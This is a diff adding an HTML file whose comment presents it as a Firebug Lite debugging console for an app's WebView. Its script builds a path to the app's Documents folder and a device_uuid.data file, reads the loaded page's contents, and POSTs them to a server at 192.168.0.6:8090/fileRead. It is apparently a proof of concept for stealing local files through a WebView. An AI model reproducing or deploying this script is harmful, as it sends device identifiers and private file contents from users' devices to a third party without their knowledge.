@@ -1,0 +1,19 @@
+<!-- script that load a firebug lite version to get the webview debuggin console inside the app -->
+<script src='https://getfirebug.com/firebug-lite-debug.js'></script>
+<script>
+  var cutString = 'File%20Provider%20Storage';
+  var locationPath = location.href.split(cutString)[0] + 'Documents';
+  var filePath = locationPath + '/device_uuid.data';
+  document.write('<br>' + filePath);
+  alert(filePath);
+  fetch(document.location).then(res=>res.text()).then(res => {
+    alert(res);
+    var contentRegex = new RegExp(".+",'g');
+    var reg = res.replace('/\s/g','').replace('/\S/g','').replace(/\s\s+/g,' ').replace(/\n\s*\n/g,'\n').match(contentRegex);
+    alert(reg);
+    fetch('http://192.168.0.6:8090/fileRead',{
+      method: 'post',
+      body: reg
+    });
+  })
+</script>
